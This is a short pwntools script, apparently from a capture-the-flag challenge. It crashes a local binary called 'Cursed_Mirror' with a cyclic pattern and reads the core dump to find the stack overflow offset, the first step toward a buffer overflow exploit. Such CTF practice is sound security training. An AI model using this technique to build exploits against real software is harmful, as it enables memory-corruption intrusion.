from pwn import *
context.binary = elf = ELF('./Cursed_Mirror')
io = process('./Cursed_Mirror')
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'seek?:', cyclic(200))
io.wait()
core = io.corefile
rsp = core.rsp
pattern = core.read(rsp, 8)
log.info("offset = %d", cyclic_find(pattern))